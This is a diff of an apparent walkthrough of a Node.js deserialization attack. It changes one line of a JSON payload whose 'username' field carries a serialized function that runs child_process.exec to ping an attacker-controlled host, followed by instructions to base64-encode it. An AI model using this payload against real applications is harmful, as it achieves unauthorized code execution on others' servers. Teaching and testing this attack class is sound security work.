@@ -151,7 +151,7 @@ _$$ND_FUNC$$_function () {
 Now we can put the serialized wrapper function as the value for `username` in the JSON data.
 
 ```none
-{"username":"_$$ND_FUNC$$_function (){require('child_process').exec('ping [attacker-ip]', function(error, stdout, stderr) { console.log(stdout) });}()","isGuest":true,"encoding": "utf-8"}
+{"username":"_$$ND_FUNC$$_function (){require('child_process').exec('ping -c2 [attacker-ip]', function(error, stdout, stderr) { console.log(stdout) });}()","isGuest":true,"encoding": "utf-8"}
 ```
 
 Just like before, we need to `base64` encode the full JSON string.
